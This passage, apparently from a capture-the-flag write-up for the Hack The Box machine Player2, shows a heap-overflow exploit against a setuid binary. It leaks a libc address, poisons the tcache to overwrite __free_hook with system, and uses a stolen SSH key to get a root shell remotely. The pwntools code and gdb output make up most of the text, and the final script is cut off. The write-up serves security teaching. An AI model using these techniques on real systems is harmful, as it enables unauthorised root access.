While most of the fields take integers, the two strings are where I’ll look for an attack. And for some reason, both times it reads strings, the program does weird things. For both reads, the program first reads the input into a buffer on the stack. This buffer is created to be 19 bytes long, which fits with the size of 0x14 = 20 for the game name in the struct. There’s also a variable that points to the 20th byte.

![image-20200204214921990](https://0xdfimages.gitlab.io/img/image-20200204214921990.png)

To read the game name, the program uses `fgets` ([documentation](http://www.cplusplus.com/reference/cstdio/fgets/)), which will read until a newline or the max size is reached, whichever comes first. For some reason, despite having only 20 bytes of space, rather than just read 20 bytes, the program will read up to 0x400 bytes. Then it calls a function I’ve named `add_null_at_newline` which does just that, and then, to prevent overflows, it places a null byte at the 20th byte, terminating the string by setting the `char_buf_terminator` variable to `0x00`. Finally, it uses `strncpy` to copy the string into the structure on the heap:

```

  puts("==New Game Configuration");
  printf(" [ Game                ]: ");
  fgets(char_buf,0x400,stdin);
  add_null_at_newline(char_buf);
  char_buf_terminator = 0;
  strncpy(config_ptr,char_buf,0x14);

```

This is weird, but not immediately vulnerable to anything. I can mess with the stack, but given the canary, there’s nothing useful I can do with this ability to write outside my bounds on the stack.

The next string read is even stranger. This time is uses `read` ([documentation](https://www.man7.org/linux/man-pages/man2/read.2.html)), which reads as much is available on the device (in this case `stdin`), up to the specified number of bytes (in this case 0x200). It then places two nulls. First it calls a function to replace a newline with a null, which should terminal the string there. It then checks if the bytes read is greater than the size of the buffer (stored in `config_ptr + 0x28`), and if so, terminals the string at that given size with a null. Then it creates space on the heap, stores the address in `config_ptr + 0x30`, and copies the full string into that location using `strlen` to get the size to copy.

```

  if (*(int *)(config_ptr + 0x28) != 0) {
    printf(" [ Description         ]: ");
    bytes_read = read(0,char_buf,0x200);
    add_null_at_newline(char_buf);
                    /* If read more than size, add null at size */
    if (*(uint *)(config_ptr + 0x28) <= (uint)bytes_read) {
      char_buf[*(uint *)(config_ptr + 0x28)] = '\0';
    }
    new_config_addr = malloc((ulong)*(uint *)(config_ptr + 0x28));
    *(void **)(config_ptr + 0x30) = new_config_addr;
    desc_buffer = *(long *)(config_ptr + 0x30);
    i = 0;
    while( true ) {
      len_truncated_input = strlen(char_buf);
      if (len_truncated_input < (ulong)(long)i) break;
      *(char *)(i + desc_buffer) = char_buf[i];
      i = i + 1;
    }

```

So when the first string is read, there will be a null at byte 20 and at the newline, which could be anywhere between 0 and 0x400. When the second string is read into that same buffer on the stack, as long as the number of bytes read is less than the size given, and if the user doesn’t pass any nulls in, no nulls are written.

![image-20200627100643712](https://0xdfimages.gitlab.io/img/image-20200627100643712.png)

Then there’s a while loop that copies this buffer from the stack into the newly `malloc` space on the heap based on a call to `strlen`, which will return the length up to the red null in the third buffer above, and therefore can overflow that space.

#### Heap Overwrite Scenario

With all of that in mind, here’s what happens if I pass in a name of `"A"*100 + \n`, a description length of 0x18, and a description of `"B"*0x16`? I choose 0x16 “B” because it’s longer than 0x14 where the null is added in the first string, but shorter than the length I gave of 0x18 so no trailing null is added. Using my Python script from earlier, I’ll issue `(Pdb) new_config("A"*100, 0x18, "B"*0x16)` and walk through the `create_config` function in `gdb`. I can set a break point at `0x4010cd`, which is the `fgets` that reads the name. I can see at this point that the config has been allocated and given a slot in the config array:

```

gdb-peda$ x/8xg 0x603060  # config array
0x603060:       0x00000000019f9260      0x0000000000000000
0x603070:       0x0000000000000000      0x0000000000000000
0x603080:       0x0000000000000000      0x0000000000000000
0x603090:       0x0000000000000000      0x0000000000000000

```

Following the pointer to the yet to be filled in config (starting 0x10 bytes before it):

```

gdb-peda$ x/16xg 0x00000000019f9250  # heap
0x19f9250:      0x0000000000000000      0x0000000000000041   # chunk size / flags
0x19f9260:      0x0000000000000000      0x0000000000000000
0x19f9270:      0x0000000000000000      0x0000000000000000
0x19f9280:      0x0000000000000000      0x0000000000000000
0x19f9290:      0x0000000000000000      0x0000000000020d71   # 0x40 bytes later, heap termination
0x19f92a0:      0x0000000000000000      0x0000000000000000
0x19f92b0:      0x0000000000000000      0x0000000000000000
0x19f92c0:      0x0000000000000000      0x0000000000000000

```

The stack buffer that will get the `fget` results is also empty. I’ll step through the `strncpy` at `0x401106`. Based on my analysis from above, I’m expecting that 100 “A” were written to the stack. Then a null was written over the 20th “A”, so the following `strncpy` will copy 19 “A” into the heap:

```

gdb-peda$ x/16xg 0x00000000019f9250  # heap
0x19f9250:      0x0000000000000000      0x0000000000000041
0x19f9260:      0x4141414141414141      0x4141414141414141
0x19f9270:      0x0000000000414141      0x0000000000000000
0x19f9280:      0x0000000000000000      0x0000000000000000
0x19f9290:      0x0000000000000000      0x0000000000020d71
0x19f92a0:      0x0000000000000000      0x0000000000000000
0x19f92b0:      0x0000000000000000      0x0000000000000000
0x19f92c0:      0x0000000000000000      0x0000000000000000

```

I can check the stack and see it also matches what I expected:

```

gdb-peda$ x/101bx 0x7ffe44197dd0  # stack
0x7ffe44197dd0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197dd8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197de0: 0x41    0x41    0x41    0x00    0x41    0x41    0x41    0x41  # null at 20
0x7ffe44197de8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197df0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197df8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197e00: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197e08: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197e10: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197e18: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197e20: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197e28: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197e30: 0x41    0x41    0x41    0x41    0x00  # null at 101 where \n was

```

I’ll continue through to `0x401209`, where the call to `read` happens. The stack buffer hasn’t changed, and the heap struct has only had the integer values filled in. When the read happens, it reads 0x16 (or 22) “B”. I’ll break again at `0x0040127f`, the start of the loop to copy from the stack into the description buffer on the heap. The stack still doesn’t have a null at the end of the “B” string, and the null from the end of the “A” string is overwritten:

```

gdb-peda$ x/101bx 0x7ffe44197dd0
0x7ffe44197dd0: 0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42
0x7ffe44197dd8: 0x42    0x42    0x42    0x42    0x42    0x42    0x42    0x42
0x7ffe44197de0: 0x42    0x42    0x42    0x42    0x42    0x42    0x41    0x41 # no null at end of Bs
0x7ffe44197de8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197df0: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197df8: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197e00: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197e08: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197e10: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197e18: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197e20: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197e28: 0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
0x7ffe44197e30: 0x41    0x41    0x41    0x41    0x00

```

This means that when `strlen` runs on the buffer, it will return 100 (0x64), which I can see if I run through the call at `0x4012ca` and look at RAX:

```

RAX: 0x64 ('d')

```

By putting a break point after the loop (`0x4012d9`) and hitting `c`, I can see the heap after the copy is done, and I’ve managed to overwrite heap metadata:

```

gdb-peda$ x/26xg 0x00000000019f9250
0x19f9250:      0x0000000000000000      0x0000000000000041  # chunk for config
0x19f9260:      0x4141414141414141      0x4141414141414141
0x19f9270:      0x0000000000414141      0x0000000200000001
0x19f9280:      0x0000000400000003      0x0000000000000018
0x19f9290:      0x00000000019f92a0      0x0000000000000021  # chuck for desc, should be only 0x20 bytes
0x19f92a0:      0x4242424242424242      0x4242424242424242
0x19f92b0:      0x4141424242424242      0x4141414141414141
0x19f92c0:      0x4141414141414141      0x4141414141414141  # next chunk should start here, but overwritten
0x19f92d0:      0x4141414141414141      0x4141414141414141
0x19f92e0:      0x4141414141414141      0x4141414141414141
0x19f92f0:      0x4141414141414141      0x4141414141414141
0x19f9300:      0x0000000041414141      0x0000000000000000
0x19f9310:      0x0000000000000000      0x0000000000000000

```

If I can overwrite heap metadata, that’s a place to try to exploit.

### Exploit

#### Libc Leak

Now that I can write out of bounds on the heap, I can turn this into a libc leak fairly easily. Starting clean, I’ll create two configurations (A and B). Then I’ll delete the first one (A). Then I’ll create a new one (C) with sizes so that it takes the space originally used by A. I’ll have C’s description overflow so that it overwrites into the next one (B), overwriting the the pointer to the description with the address of a libc function. Then I’ll use the menu to display B’s config. Instead of displaying the description, it will print the address of the libc function.

I can get a list of functions in `gdb` (run before starting the program or a bunch more junk will be added):

```

gdb-peda$ info functions 
All defined functions:

Non-debugging symbols:
0x00000000004007f0  free@plt
0x0000000000400800  putchar@plt
0x0000000000400810  strncpy@plt
0x0000000000400820  puts@plt
0x0000000000400830  strlen@plt
0x0000000000400840  __stack_chk_fail@plt
0x0000000000400850  setbuf@plt
0x0000000000400860  strchr@plt
0x0000000000400870  printf@plt
0x0000000000400880  read@plt
0x0000000000400890  fgets@plt
0x00000000004008a0  strtol@plt
0x00000000004008b0  malloc@plt
0x00000000004008c0  exit@plt
0x00000000004008d0  sleep@plt

```

I need a function to leak, so I’ll pick `free` arbitrarily (any of these functions would be equally useful to leak). The output above gives the PLT addresses for each function. I need the GOT address (which will point to the function in libc), which I can get by inspecting the first instruction at the PLT address:

```

gdb-peda$ x/i 0x00000000004007f0
   0x4007f0 <free@plt>: jmp    QWORD PTR [rip+0x202782]        # 0x602f78 <free@got.plt>
gdb-peda$ x/xg 0x602f78
0x602f78 <free@got.plt>:        0x00007f0653a1b1d0

```

I’ll record 0x602f78, the GOT address for `free`, for later.

I’ll start with this skeleton:

```

new_config('dummy1', 0x18, 'to be deleted')
new_config('leak', 0x18, 'to be overwritten')
del_config(0)
new_config('overwriter', 0x18, 'overflow')
pdb.set_trace()

```

I’ll connect with `gdb` and look at the heap:

```

gdb-peda$ x/8xg 0x603060
0x603060:       0x0000000000f2f260      0x0000000000f2f2c0
0x603070:       0x0000000000000000      0x0000000000000000
0x603080:       0x0000000000000000      0x0000000000000000
0x603090:       0x0000000000000000      0x0000000000000000
gdb-peda$ x/26xg 0x0000000000f2f260
0xf2f260:       0x746972777265766f      0x0000000000007265  # "overwriter"
0xf2f270:       0x0000000000000000      0x0000000200000001
0xf2f280:       0x0000000400000003      0x0000000000000018
0xf2f290:       0x0000000000f2f2a0      0x0000000000000021  # 0xf2f2a0 --> desc
0xf2f2a0:       0x776f6c667265766f      0x0000000000007265  # "overflow"
0xf2f2b0:       0x0000000000000000      0x0000000000000041
0xf2f2c0:       0x000000006b61656c      0x0000000000000000
0xf2f2d0:       0x0000000000000000      0x0000000200000001
0xf2f2e0:       0x0000000400000003      0x0000000000000018
0xf2f2f0:       0x0000000000f2f300      0x0000000000000021  # 0xf2f300 --> desc
0xf2f300:       0x766f206562206f74      0x6574746972777265  # "to be overwritten"
0xf2f310:       0x0000000000e67e6e      0x0000000000020cf1
0xf2f320:       0x0000000000000000      0x0000000000000000

```

That will work nicely. I just need to change “overflow” to a long enough buffer such that it overwrites the value 0xf2f300 at address 0xf2f2f0 with the `free` GOT address from earlier.

Now I’ll update my Python:

```

new_config('dummy1', 0x18, 'to be deleted')
new_config('leak', 0x18, 'to be overwritten')
del_config(0)
new_config(b'A'*0x50 + p64(0x602f78), 0x18, 'B'*0x16)
print(print_config(1))
pdb.set_trace()

```

The third config will go into slot 0, and the description will overwrite the pointer to the description in slot 1 with the pointer to `free`.

```

root@kali# python3 ./pwn_protobs.py 
[+] Starting local process './Protobs': pid 17356
b'  [ Game                ]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAx/`\n  [ Contrast            ]: 1094795585\n  [ Gamma               ]: 1094795585\n  [ Resolution X-Axis   ]: 1094795585\n  [ Resolution Y-Axis   ]: 1094795585\n  [ Controller          ]: 1094795585\n  [ Description         ]: \xd0\x91\xd3$\xe0\x7f\n\n'
--Return--
> /media/sf_CTFs/hackthebox/player2-10.10.10.170/binary/pwn_protobs.py(43)<module>()->None
-> pdb.set_trace()
(Pdb) 

```

It worked! In the description field there’s just some non-ascii stuff that is the address of `free`. I can clean up how I print a bit and add some math to calculate the libc base address:

```

new_config('dummy1', 0x18, 'to be deleted')   # slot 0
new_config('leak', 0x18, 'to be overwritten') # slot 1
del_config(0)
new_config(b'A'*0x50 + p64(Protobs.got["free"]), 0x18, 'B'*0x16) # slot 0
leaked_free = u64(print_config(1)[-8:-2].ljust(8, b"\x00"))
print(f'[+] Leaked free: 0x{leaked_free:x}')
libc_base = leaked_free - libc.sym["free"]
print(f'[+] libc base address: 0x{libc_base:x}')

```

```

root@kali# python3 ./pwn_protobs.py 
[+] Starting local process './Protobs': pid 17471
[+] Leaked free: 0x7fdf906c81d0
[+] libc base address: 0x7fdf9062f000

```

#### Heap tcache Bins

With the leak I’ve bypassed ASLR. I can now work to get a shell. I’ll notice that if I start the program, add a config, and then delete it, both of the freed buffers (config object and description buffer) are in [tcache bins](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/tcache/). The tcache are thread specific bins introduced in glic 2.26 (Ubuntu 17.10), and consist of 64 singly-linked lists or bins that can each hold up to seven same-sized chunks. When a freed buffer goes to tcache, it is left marked as in use, and the first word of the data is used as an entry in the linked list. So when the first buffer is added, the address of that buffer is added to the tcache’s starting list, and then a null terminator is added as the first word of data. If a second is added, it’s first word points to the original bin, and the tcache not points to it. And for different sized buffers, they end up in different lists.

I’ll show a couple examples. First I’ll start, create, delete:

```

root@kali# python3 pwn_protobs.py 
[+] Starting local process '/media/sf_CTFs/hackthebox/player2-10.10.10.170/binary/Protobs': pid 2574
> /media/sf_CTFs/hackthebox/player2-10.10.10.170/binary/pwn_protobs.py(46)<module>()
-> new_config('dummy1', 0x18, 'to be deleted')   # 0
(Pdb) new_config('0xdf', 0x18, '0xdf config')
(Pdb) del_config(0)

```

Attached gdb and run `heapinfo`:

```

root@kali# gdb -q -p $(pidof Protobs) -ex 'b *0x4013cd'
Attaching to process 2574
Reading symbols from /media/sf_CTFs/hackthebox/player2-10.10.10.170/binary/Protobs...
(No debugging symbols found in /media/sf_CTFs/hackthebox/player2-10.10.10.170/binary/Protobs)
Reading symbols from libc.so.6...
Reading symbols from ld-2.29.so...
...[snip]...
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x23322b0 (size : 0x20d50) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x20)   tcache_entry[0]: 0x23322a0
(0x40)   tcache_entry[2]: 0x2332260

```

I can look at the buffers on the heap:

```

gdb-peda$ x/24xg 0x2332260 - 0x10
0x2332250:      0x0000000000000000      0x0000000000000041  # chunk metadata
0x2332260:      0x0000000000000000      0x0000000002332010  # null terminator for 0x40 list
0x2332270:      0x0000000000000000      0x0000000200000001  # old data
0x2332280:      0x0000000400000003      0x0000000000000018
0x2332290:      0x00000000023322a0      0x0000000000000021  # ptr to desc, chunk metadata
0x23322a0:      0x0000000000000000      0x0000000002332010  # null terminator for 0x20 list
0x23322b0:      0x0000000000000000      0x0000000000020d51  # top of heap
0x23322c0:      0x0000000000000000      0x0000000000000000
0x23322d0:      0x0000000000000000      0x0000000000000000
0x23322e0:      0x0000000000000000      0x0000000000000000
0x23322f0:      0x0000000000000000      0x0000000000000000
0x2332300:      0x0000000000000000      0x0000000000000000

```

The previous in use flag (low bit in the size word) for both of these is set to active as expected, and both freed buffers have null words written at the start of the data.

If I (starting clean) create two, and then delete them:

```

(Pdb) new_config('0xdf', 0x18, '0xdf config')
(Pdb) new_config('0xdf', 0x18, '0xdf config')
(Pdb) del_config(1)
(Pdb) del_config(0)

```

There are now two chunks in each bin (0x20 and 0x40), and that the last in goes to the front of the list:

```

gdb-peda$ heapinfo
...[snip]...
(0x20)   tcache_entry[0]: 0x15172a0 --> 0x1517300 # old desc 0 --> old desc 1
(0x40)   tcache_entry[2]: 0x1517260 --> 0x15172c0 # old config 0 --> old config 1

```

These linked lists are kept with addresses in the space where the data used to be in the heap. Now on the heap the pointers from the chunks at the front of the list to the later chunks:

```

gdb-peda$ x/32xg 0x1517260 - 0x10
0x1517250:      0x0000000000000000      0x0000000000000041 # config 0 chunk meta
0x1517260:      0x00000000015172c0      0x0000000001517010 # ptr to next 0x40 tcache chunk
0x1517270:      0x0000000000000000      0x0000000200000001
0x1517280:      0x0000000400000003      0x0000000000000018
0x1517290:      0x00000000015172a0      0x0000000000000021 # desc 0 chunk meta 
0x15172a0:      0x0000000001517300      0x0000000001517010 # ptr to next 0x20 tcache chunk
0x15172b0:      0x0000000000000000      0x0000000000000041 # config 1 chunk meta
0x15172c0:      0x0000000000000000      0x0000000001517010 # null terminate tcache list
0x15172d0:      0x0000000000000000      0x0000000200000001
0x15172e0:      0x0000000400000003      0x0000000000000018
0x15172f0:      0x0000000001517300      0x0000000000000021 # desc 1 chunk meta
0x1517300:      0x0000000000000000      0x0000000001517010 # null terminate tcache list
0x1517310:      0x0000000000000000      0x0000000000020cf1
0x1517320:      0x0000000000000000      0x0000000000000000
0x1517330:      0x0000000000000000      0x0000000000000000
0x1517340:      0x0000000000000000      0x0000000000000000

```

If I create a config now, I’ll see that the new chunks are taken from the front of the list:

```

gdb-peda$ heapinfo
...[snip]...
(0x20)   tcache_entry[0]: 0x1517300
(0x40)   tcache_entry[2]: 0x15172c0

```

Because these linked list pointers are kept on the heap, if I can get a write out of bounds (which I’ve shown I can), I can overwrite the linked list pointers and trick the heap management into thinking it can give out space of the size of that list at the address I gave it. In other words, if I can overwrite a pointer in the list, I can get `malloc` to return a pointer to write wherever I want.

I’ll demonstrate in `gdb`, continuing from above. The null terminator for the 0x20 bin linked list is at `0x1517300`. I’ll change it to some other address on the heap:

```

gdb-peda$ set {long}0x1517300=0x1517320

```

Now, the tcache lists show another entry:

```

gdb-peda$ heapinfo
...[snip]...
(0x20)   tcache_entry[0]: 0x1517300 --> 0x1517320
(0x40)   tcache_entry[2]: 0x15172c0

```

This address doesn’t have to be on the heap. For example, I can set it to the address of the function `__free_hook`, which runs each time `free` is called (and will be useful for exploitation in a minute):

```

gdb-peda$ info address __free_hook
Symbol "__free_hook" is static storage at address 0x7fde701625a8.
gdb-peda$ set {long}0x1517300=0x7fde701625a8
gdb-peda$ heapinfo
...[snip]...
(0x20)   tcache_entry[0]: 0x1517300 --> 0x7fde701625a8
(0x40)   tcache_entry[2]: 0x15172c0

```

#### Exploit Strategy

To summarize, the attack relies on the fact the that heap offers blocks of data with the metadata that controls how those blocks are generated right next to the data buffers themselves. So if I can write outside of the buffer, I can manipulate the metadata to confuse the heap functions like `free` and `malloc` into writing where I want.

To leak libc, I just overwrite from one config into the next, putting the address of a libc function into the description field of a config, and then printing it.

To get execution, I’ll take advantage of the fact that tcache bins are kept in a linked list in the no longer in use data space on the heap. If I can write a pointer into that list, I can then ask the heap for space (`malloc`) and I can use the program to write data there. So I’ll add the address of `__free_hook` to the list, and then create a config that let’s me write the address of `system` there.

To get a shell, the exploit will take the following steps:
1. Perform libc leak as above, leaving configs 0 and 1 in use, and 1 in corrupted state. I’ll leave configs 0 and 1 alone, as trying to free 1 will crash things.
2. I’ll create two new configs in bins 2 and 3, both with description sizes of 0x18.
3. I’ll delete 3 then 2, so that the chunks from 2 are used first.
4. I’ll create a new config with description size 0x18 that overflows the descpition and replaces the null terminator for the tcache linked list with the address of `__free_hook`. Now the 0x20 list will have one entry (config 3 description), and the 0x40 list will have two, from config 3 and now `__free_hook`.
5. I’ll create a new config, with name `/bin/sh`, description size 0x38, and description value being the address of `system` in libc. When this happens, first the config will `malloc`, which will get the config 3 space from above. Then it will `malloc` the description space. Since it’s also 0x38, it will get the address of `__free_hook`, which it will then write the address of `system` into.
6. Free config 3, which will call `free(/bin/sh)`, which will be passed to `__free_hook`, which is actually `system`. Shell!

In my script, that looks like:

```

new_config('A'*16, 0x18, 'something')   # 2
new_config('B'*16, 0x18, 'something')   # 3
del_config(3)
del_config(2)
new_config(b'C'*0x20 + p64(free_hook_address), 0x18, 'D'*0x16) #2
new_config('/bin/sh', 0x38, p64(system_address)) # 3

del_config(3)
p.interactive()

```

#### Step By Step

I’ll add `pdb.set_trace()` just above that new code and check out what happens at each step. When I attach `gdb`, there are no tcache bins, and there are two configs:

```

gdb-peda$ x/8xg 0x603060
0x603060:       0x000000000163f260      0x000000000163f2c0
0x603070:       0x0000000000000000      0x0000000000000000
0x603080:       0x0000000000000000      0x0000000000000000
0x603090:       0x0000000000000000      0x0000000000000000

```

And the heap is a bit messed up from the overflow:

```

gdb-peda$ x/28xg 0x000000000163f260 - 0x10
0x163f250:      0x0000000000000000      0x0000000000000041
0x163f260:      0x4141414141414141      0x4141414141414141
0x163f270:      0x0000000000414141      0x0000000200000001
0x163f280:      0x0000000400000003      0x0000000000000018
0x163f290:      0x000000000163f2a0      0x0000000000000021
0x163f2a0:      0x4242424242424242      0x4242424242424242
0x163f2b0:      0x4141424242424242      0x4141414141414141
0x163f2c0:      0x4141414141414141      0x4141414141414141
0x163f2d0:      0x4141414141414141      0x4141414141414141
0x163f2e0:      0x4141414141414141      0x4141414141414141
0x163f2f0:      0x0000000000602f78      0x0000000000000021
0x163f300:      0x766f206562206f74      0x6574746972777265
0x163f310:      0x00000000005eee6e      0x0000000000020cf1
0x163f320:      0x0000000000000000      0x0000000000000000

```

I’ll step in Python to run the two add configs. They show up in gdb:

```

gdb-peda$ x/8xg 0x603060
0x603060:       0x000000000163f260      0x000000000163f2c0
0x603070:       0x000000000163f320      0x000000000163f380
0x603080:       0x0000000000000000      0x0000000000000000
0x603090:       0x0000000000000000      0x0000000000000000

```

And look fine on the heap:

```

gdb-peda$ x/26xg 0x000000000163f320 - 0x10
0x163f310:      0x00000000005eee6e      0x0000000000000041
0x163f320:      0x4141414141414141      0x4141414141414141
0x163f330:      0x0000000000000000      0x0000000200000001
0x163f340:      0x0000000400000003      0x0000000000000018
0x163f350:      0x000000000163f360      0x0000000000000021
0x163f360:      0x6e696874656d6f73      0x4141414141414167
0x163f370:      0x0000000000000000      0x0000000000000041
0x163f380:      0x4242424242424242      0x4242424242424242
0x163f390:      0x0000000000000000      0x0000000200000001
0x163f3a0:      0x0000000400000003      0x0000000000000018
0x163f3b0:      0x000000000163f3c0      0x0000000000000021
0x163f3c0:      0x6e696874656d6f73      0x4242424242424267
0x163f3d0:      0x0000000000000000      0x0000000000020c31

```

Now if I delete 3 then 2, I can see the heap where the linked lists start:

```

gdb-peda$ x/26xg 0x000000000163f320 - 0x10
0x163f310:      0x00000000005eee6e      0x0000000000000041
0x163f320:      0x000000000163f380      0x000000000163f010 # tcache 0x40 ptr
0x163f330:      0x0000000000000000      0x0000000200000001
0x163f340:      0x0000000400000003      0x0000000000000018
0x163f350:      0x000000000163f360      0x0000000000000021
0x163f360:      0x000000000163f3c0      0x000000000163f010 # tcache 0x20 ptr
0x163f370:      0x0000000000000000      0x0000000000000041
0x163f380:      0x0000000000000000      0x000000000163f010 # tcache 0x40 null term
0x163f390:      0x0000000000000000      0x0000000200000001
0x163f3a0:      0x0000000400000003      0x0000000000000018
0x163f3b0:      0x000000000163f3c0      0x0000000000000021
0x163f3c0:      0x0000000000000000      0x000000000163f010 # tcache 0x20 null term
0x163f3d0:      0x0000000000000000      0x0000000000020c31

```

And there’s 4 chunks in tcache:

```

(0x20)   tcache_entry[0]: 0x163f360 --> 0x163f3c0
(0x40)   tcache_entry[2]: 0x163f320 --> 0x163f380

```

Now I’ll step in Python, adding with overflow. The heap now has the address of `__free_hook` in the 0x40 linked list:

```

gdb-peda$ x/26xg 0x000000000163f320 - 0x10
0x163f310:      0x00000000005eee6e      0x0000000000000041 # new config
0x163f320:      0x4343434343434343      0x4343434343434343
0x163f330:      0x0000000000434343      0x0000000200000001
0x163f340:      0x0000000400000003      0x0000000000000018
0x163f350:      0x000000000163f360      0x0000000000000021 # new config desc
0x163f360:      0x4444444444444444      0x4444444444444444 # overflows
0x163f370:      0x4343444444444444      0x4343434343434343 # tcache chunk meta overflowed
0x163f380:      0x00007fbf586255a8      0x000000000163f010 # null pointer now points to __free_hook
0x163f390:      0x0000000000000000      0x0000000200000001
0x163f3a0:      0x0000000400000003      0x0000000000000018
0x163f3b0:      0x000000000163f3c0      0x0000000000000021
0x163f3c0:      0x0000000000000000      0x000000000163f010
0x163f3d0:      0x0000000000000000      0x0000000000020c31

```

`heapinfo` shows it as well:

```

(0x20)   tcache_entry[0]: 0x163f3c0
(0x40)   tcache_entry[2]: 0x163f380 --> 0x7fbf586255a8

```

Before taking the next step, I’ll show that `__free_hook` is null:

```

gdb-peda$ x/xg 0x00007fbf586255a8
0x7fbf586255a8 <__free_hook>:   0x0000000000000000

```

On more step, `new_config('/bin/sh', 0x38, p64(system_address))`, and now the 0x40 tcache bin is gone.

```

(0x20)   tcache_entry[0]: 0x163f3c0

```

On creating the config, the first address (0x163f380) was removed from the linked list and put into use. Then, since this time the description length is longer, it also pulls from the 0x40 tcache bin, and is given the address of `__free_hook`.

The new config is on the heap:

```

gdb-peda$ x/26xg 0x000000000163f320 - 0x10
0x163f310:      0x00000000005eee6e      0x0000000000000041
0x163f320:      0x4343434343434343      0x4343434343434343
0x163f330:      0x0000000000434343      0x0000000200000001
0x163f340:      0x0000000400000003      0x0000000000000018
0x163f350:      0x000000000163f360      0x0000000000000021
0x163f360:      0x4444444444444444      0x4444444444444444
0x163f370:      0x4343444444444444      0x4343434343434343 # meta still overwritten
0x163f380:      0x0068732f6e69622f      0x0000000000000000 # name has /bin/sh
0x163f390:      0x0000000000000000      0x0000000200000001
0x163f3a0:      0x0000000400000003      0x0000000000000038
0x163f3b0:      0x00007fbf586255a8      0x0000000000000021 # desc points to __free_hook
0x163f3c0:      0x0000000000000000      0x000000000163f010
0x163f3d0:      0x0000000000000000      0x0000000000020c31

```

Now `__free_hook` points to `system`:

```

0x7fbf586255a8 <__free_hook>:   0x00007fbf58490fd0
gdb-peda$ x/xg 0x00007fbf58490fd0
0x7fbf58490fd0 <__libc_system>: 0xfb26e90b74ff8548

```

#### Local

I’ll remove the `set_trace()` and run it locally:

```

root@kali# python3 pwn_protobs.py 
[*] '/media/sf_CTFs/hackthebox/player2-10.10.10.170/binary/Protobs'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fd000)
    RUNPATH:  b'/opt/Configuration_Utility'
[*] '/media/sf_CTFs/hackthebox/player2-10.10.10.170/binary/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Starting local process '/media/sf_CTFs/hackthebox/player2-10.10.10.170/binary/Protobs': pid 3101
[+] Leaked free: 0x7f720f7721d0
[+] libc base address: 0x7f720f6d9000
[+] system address: 0x7f720f72bfd0
[+] free_hook address: 0x7f720f8c05a8
[*] Switching to interactive mode
sh: 1: пr\x0f\x7f: not found
$ id
uid=0(root) gid=0(root) groups=0(root)

```

#### Remote

To have the script run remotely, I just need to add a reference to use the SSH key I obtained to connect and run there:

```

if len(sys.argv) > 1 and sys.argv[1] in ["-remote", "-r"]:
    sshConn = ssh(host='10.10.10.170', user='observer', keyfile='/root/id_rsa_player2_observer')
    p = sshConn.process('/opt/Configuration_Utility/Protobs')
else:
    p = process(Protobs.path) # local

```

Now, if I call it the script with `-r` or `--remote`, I get a root shell on Player2:

```

root@kali# python3 pwn_protobs.py -r
[*] '/media/sf_CTFs/hackthebox/player2-10.10.10.170/binary/Protobs'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fd000)
    RUNPATH:  b'/opt/Configuration_Utility'
[*] '/media/sf_CTFs/hackthebox/player2-10.10.10.170/binary/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Connecting to 10.10.10.170 on port 22: Done
[*] observer@10.10.10.170:
    Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64
    Version:  5.2.5
    ASLR:     Enabled
[+] Starting remote process b'/opt/Configuration_Utility/Protobs' on 10.10.10.170: pid 13612
[+] Leaked free: 0x7f23dbf6f1d0
[+] libc base address: 0x7f23dbed6000
[+] system address: 0x7f23dbf28fd0
[+] free_hook address: 0x7f23dc0bd5a8
[*] Switching to interactive mode
/bin/dash: 1: Џ\xf2\xdb#: not found
# $ id
uid=1000(observer) gid=1000(observer) euid=0(root) groups=1000(observer)

```

With this shell I can grab `root.txt`:

```

# $ cat /root/root.txt
73DAEF0B************************

```

#### Final Code

The final script follows:

```

#!/usr/bin/env python3

import pdb
import sys
from pwn import *

def new_config(name, dsize, desc):
    p.recvuntil('$ ')
    p.sendline('2')
    p.recvuntil(']: ')
